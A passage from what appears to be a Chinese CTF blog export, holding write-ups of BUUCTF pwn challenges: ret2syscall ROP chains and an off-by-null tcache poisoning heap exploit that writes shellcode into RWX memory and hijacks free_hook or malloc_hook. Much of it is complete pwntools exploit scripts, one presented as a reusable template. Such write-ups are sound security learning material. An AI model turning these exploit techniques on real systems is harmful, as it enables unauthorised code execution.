class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBB81</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="cmcc-simplerop">cmcc_simplerop</h2><p><img src="../img/2706180-20220127203856048-493266564.png" alt=""></p><p><img src="../img/2706180-20220127203918982-250461252.png" alt=""></p><p>没有canary，并且这里存在溢出，因此我们可以rop。</p><p><img src="../img/2706180-20220127204005942-290500809.png" alt=""></p><p>但是紧接着，就发现左边是这么一坨函数，<strong>就意味着这道题是静态链接，静态链接就意味着我们没办法ret2libc，没有后门函数，没办法ret2text，开了NX保护，没办法ret2shellcode。</strong></p><p><strong>因此只能是ret2syscall了</strong>。</p><p>我们现在需要去找gadget片段。</p><p><strong>因为我们需要设置eax,ebx,ecx,edx这四个寄存器的参数，因此需要去分别找pop这四个寄存器的指令。</strong></p><p><img src="../img/2706180-20220127204033314-1369511097.png" alt=""></p><p>这里直接就发现了连续pop三个寄存器的指令，比较nice。</p><p><img src="../img/2706180-20220127204105424-1865663775.png" alt=""></p><p>寄存器找完了，现在最大的问题就是怎么把/bin/sh给传进去？</p><p>这道题没有类似于pop [ecx]这类指令，因此我们只能另辟蹊径。</p><p><strong>因为存在read函数(如果没有read函数的话，那就系统调用，不过我试了一下，没成功，但原理上是可行的)</strong>，因此我们可以先把read的地址放到返回地址，再执行一次read，将参数写入我们指定的bss段地址，（<strong>为什么要写入bss段，是因为没开pie的情况下，bss段地址是不变的，并且这道题的bss段是可写，这样我们写入参数之后，直接再拿写入的那个bss地址当做ebx的参数即可，如果是写入栈中的话，还需要泄露栈中地址</strong>）</p><p>并且值得一提的是，我们<font color=red><strong>之后使用pop eax+p32(0xb)这种指令的前提是此时栈顶要是0xb才可以，但是当我们执行read之后，它的三个参数都是在栈顶的，因此我们需要pop三次，把read的参数先给弹出来，这样才能顺理传之后的参数</strong></font>。</p><p><strong>最后要注意的一个点就是，这道题用IDA看，距离返回地址是0x18,但是用gdb调试一下发现，它距离返回地址实际上是0x20。</strong></p><p>最后就是exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27707</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bae06</span></span><br><span class="line">pop_ebx=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806e851</span></span><br><span class="line">pop_edx=<span class="number">0x0806e82a</span></span><br><span class="line">int_0x80=<span class="number">0x080493e1</span></span><br><span class="line">bss_addr=<span class="number">0x080EAFF0</span></span><br><span class="line">read_addr=<span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+p32(read_addr)+p32(pop_edx_ecx_ebx)<span class="comment">#这三个pop处于read函数的返回地址，连续pop三次，把栈顶的内容弹出来</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)<span class="comment">#read函数的参数</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">11</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)<span class="comment">#弹给eax的内容是11，因为11是32位程序execve的系统调用号</span></span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#这里一定要输入这个\x00去截断</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>##picoctf_2018_can_you_gets_me</p><p><img src="../img/2706180-20220303194850099-1407586466.png" alt=""></p><p><img src="../img/2706180-20220303194913108-59758844.png" alt=""></p><p>发现是静态链接，之前静态链接就是直接去用ropgadget搜了ropchain，然后我这道题直接搜了一下。<br>用下面这个命令搜（a是文件名）<br><img src="../img/2706180-20220303195629484-228134511.png" alt=""><br><img src="../img/2706180-20220303194931739-320603106.png" alt=""></p><p><img src="../img/2706180-20220303194955331-2123755447.png" alt=""><br>发现没有canary，并且有溢出<br>那就没少好说的了，看一下溢出偏移</p><p><img src="../img/2706180-20220303194941901-2106523077.png" alt=""></p><p>发现溢出偏移为28，然后直接打就行了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  <span class="comment">#这里必须要引入这个包，不然是打不通的</span></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29254</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./a&#x27;)</span></span><br><span class="line">offset=<span class="number">28</span></span><br><span class="line">p=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这就是定死的模板，没什么好说的。</p><p>如果手写的话也可以，原理的话上面解释过了，这个也可以当做模板来用，需要修改的参数，我后面加了三个*。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#d=remote(&#x27;node4.buuoj.cn&#x27;,25149)#***</span></span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806cc25</span> <span class="comment">#*** 这些片段的话，直接用Ropgadget搜就可以了</span></span><br><span class="line">bss_addr=<span class="number">0x080e9000</span>      <span class="comment">#***这个用vmmap看一下哪里是可写的，然后放上这段可写的地址就行了</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b81c6</span>  <span class="comment">#***</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span>  <span class="comment">#***</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de955</span>  <span class="comment">#***</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806f02a</span>  <span class="comment">#***</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ea</span><span class="comment">#*** 这个地方用这个指令找</span></span><br><span class="line"><span class="comment"># ROPgadget --binary  a | grep &#x27;pop dword ptr \[ecx\]&#x27; 这里不一定要ecx的，别的寄存器也可以</span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">28</span>*<span class="string">&#x27;a&#x27;</span> <span class="comment">#***</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf2019_easy_heap</title>
      <link href="/posts/b5a0cf5.html"/>
      <url>/posts/b5a0cf5.html</url>
      
        <content type="html"><![CDATA[<h3 id="保护策略：">保护策略：</h3><p><img src="../img/2706180-20221004174330248-2145656851.png" alt=""></p><h3 id="漏洞所在：">漏洞所在：</h3><p><img src="../img/2706180-20221004174342408-238813370.png" alt=""></p><p>在input函数中，存在一个off by null漏洞。</p><p>并且程序执行mmap来映射了一段可读可写可执行的地址，并且还把地址打印了出来。</p><p><img src="../img/2706180-20221004174406746-192348655.png" alt=""></p><h3 id="大致思路：">大致思路：</h3><p>首先是这道题映射了一段可读可写可执行的区域，同时没开沙箱，如果我们可以在这个地方写入shellcode的话，其实我们再劫持free_hook的时候，就没必要写入libc里的system地址了(直接写shellcode的地址即可)。而这道题没有show函数，所以其实可以猜测这道题出题人大概率是没打算让我们去泄露libc地址的(如果我们打io leak的话，肯定也是可以泄露的)。</p><p>所以这题主要就是去往mmap映射的内存中写入shellcode以及将free_hook给申请出来，往里面写入shellcode的地址。</p><h4 id="往mmap映射的内存里写入shellcode">往mmap映射的内存里写入shellcode</h4><p>我们肯定是要打一个tcache dup+tcache poisoning来将mmap映射的内存申请出来，但是没有UAF漏洞，所以我们利用off by null来打tcache dup的话，略微有点麻烦，不过问题不大。</p><p>首先是申请十个堆块，再释放掉其中的七个填满tcache bin。(还需要留一个防止一会堆块进入unsorted bin中和top chunk合并)</p><p>除此之外，我们还需要有三个堆块利用off by null完成堆块合并，然后做一个堆块重叠出来。</p><p>下图为编辑前的堆块和bins布局</p><p><img src="../img/2706180-20221004174429647-465687303.png" alt=""></p><p><img src="../img/image-20221007235156247.png" alt="image-20221007235156247"></p><p>下图为合并后的情况：</p><p><img src="../img/2706180-20221004174531971-356622684.png" alt=""></p><p>做出了堆块重叠后，因为是2.27的libc，因此我们直接打tcache dup+tcache poisoning即可(不过在这之前需要将tcache bin给清空)，如下图</p><p><img src="../img/2706180-20221004174614156-1953839367.png" alt=""></p><p>将mmap映射出的内存申请出来，如下图：</p><p><img src="../img/2706180-20221004174627014-747608965.png" alt=""></p><p>下图为shellcode已经写入内存的情况：</p><p><img src="../img/2706180-20221004174649212-432128807.png" alt=""></p><h4 id="申请出来free-hook">申请出来free_hook</h4><p>在不知道libc地址的情况下，把free_hook申请出来的话，我们只能去利用unsorted bin里残留的fd指针。</p><p>在布局之前，我们先把之前申请出来的chunk全部给释放到unsorted bin中，然后申请出来(然后就不管这片内存了，我们重新执行add函数进行新的布局)。<strong>并且需要注意的是上面打完了tcache dup，就导致0x100这条链已经坏了，所以我们之后无法再使用这条链了。</strong></p><p>利用思路是再进行一次堆块重叠的布局，然后这次不打tcache dup，直接先将spy chunk(堆块重叠的那个chunk)释放掉，然后让unsorted bin的fd指针落在spy chunk上，这样tcache bin链上就出现了libc地址。然后将spy chunk的内存申请出来(因为我们造成了堆块重叠，所以即可以让spy chunk处于tcache链上，同时还能把它申请出来进行编辑)去控制tcache链上的fd指针，将main_arena+88的地址修改为free_hook的地址(需要爆破半个字节)再申请出来即可。</p><p>最初我们的布局是这样：</p><p><img src="../img/2706180-20221004174716803-333842617.png" alt=""></p><p>利用off by null如下：</p><p><img src="../img/image-20221007235233295.png" alt="image-20221007235233295"></p><p>进行合并之后如下：</p><p><img src="../img/image-20221007235245651.png" alt="image-20221007235245651"></p><p>接下来就有讲究了，我们先释放掉spy chunk让其进入tcache bin中，如下</p><p><img src="../img/image-20221007235259547.png" alt="image-20221007235259547"></p><p>然后执行add函数申请内存，保证让unsorted bin中的fd指针落在tcache链的fd指针上。如下</p><p><img src="../img/image-20221007235311061.png" alt="image-20221007235311061"></p><p>最后一步将spy chunk这片申请出来(不能正好是spy chunk原本的size，不然就直接从tcache bin里拿了)，比如我写的脚本里，spy chunk的大小是0x90，这里我就申请一个0x30的chunk，就可以对这片内存进行操作了。然后去编辑刚刚申请0x30的chunk改main_arena+88为free_hook的地址，这里是需要爆破半个字节的。(本地调的时候，可以关闭ASLR就不用再爆破了)</p><p>这里我就不演示了爆破了，最后就是将爆出来的free_hook地址申请出来，写入最开始mmap映射出来的那个地址即可。最终执行free函数获取shell。</p><h3 id="EXP：">EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0xC85</span></span><br><span class="line">d_e=<span class="number">0xC9D</span></span><br><span class="line">d_d=<span class="number">0xC91</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pointer Address &quot;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Mmap: &quot;</span>)</span><br><span class="line">    mmap_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;mmap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0xf8</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">0x40</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e) </span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#delete(8)</span></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#double free</span></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0xf8)</span></span><br><span class="line">    edit(<span class="number">8</span>,p64(mmap_addr))</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line">    edit(<span class="number">12</span>,shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">    <span class="comment">#上述在完成往mmap_addr写入shellcode</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x9f0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)<span class="comment">#spy chunk</span></span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x590</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x4f8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;\xe8\x18&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">0x88</span>)</span><br><span class="line">    edit(<span class="number">6</span>,p64(mmap_addr))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25780)</span></span><br><span class="line">        log(<span class="string">&#x27;-----------------&gt;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25780&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007235333587.png" alt="image-20221007235333587"></p><p>最近快考试了，这段时间基本没有咋在buu上刷题了，不复习的时候去出了几道题。hhh，本以为再做堆的时候要比较吃力或者看看wp啥的，不过今天随便在buu上找了一道堆做了一下，没一会就做出来了，感觉还行的哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcache poisoning </tag>
            
            <tag> off_by_null </tag>
            
            <tag> tcache dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_easy_heap</title>
      <link href="/posts/afe33925.html"/>
      <url>/posts/afe33925.html</url>
      
        <content type="html"><![CDATA[<h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220827143912772-1288382840.png" alt=""></p><h2 id="漏洞所在：">漏洞所在：</h2><p>在edit函数中的输入函数内，存在一个off by null的漏洞。(如下图)</p><p><img src="../img/2706180-20220827144620544-33395681.png" alt=""></p><p>然后在程序的开始部分，使用mmap函数映射了一段可读可写可执行的内存区出来，并将该地址打印了出来。</p><p><img src="../img/2706180-20220827144132190-233381137.png" alt=""></p><h2 id="利用思路：">利用思路：</h2><p>这题的libc版本是2.27，因此可以利用off by null打一个tcache dup。但难点在于没有show函数，且开了FULL RELRO保护。通常我们采取的措施是io leak，这属于常规做法，但是这道题还给了一片可读可写可执行的区域，因此如果我们能在这个区域写入shellcode，并最后劫持malloc_hook为这个地址也是可以拿到shell的而且全程不需要泄露地址。</p><p>因此这道题有两种做法，我都分别记录一下。</p><p>先说全程不泄露libc地址的这个方法。</p><h3 id="方法一：">方法一：</h3><p>先利用off by null漏洞做一个堆块重叠，然后打tcache dup，此时就可以再打tcache poisoning了，由于我们知道那片可读可写可执行的内存地址，所以我们直接将其申请出来，写入shellcode。（我这里是提前准备了两组tcache dup）</p><p>这部分的exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcache dup</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后我们要将malloc_hook给申请出来写入shellcode的地址，这里我们采用的方法是打一个off by null做一个堆块重叠，就是让两个要合并的堆块中间夹杂一个被释放掉且位于tcachebin中的堆块，当两个堆块合并后，我们控制一下申请出来的内存，让unsorted bin的fd指针落在tcachebin的fd指针上即可。(下面两张图片为申请前后的情况)</p><p><img src="../img/2706180-20220827144207436-1577307073.png" alt=""></p><p><img src="../img/2706180-20220827144219767-514005889.png" alt=""></p><p>然后我们修改其main_arena+88最后一个字节为0x30，即可将其改为malloc_hook的地址。然后把malloc_hook申请出来写入shellcode的地址</p><h3 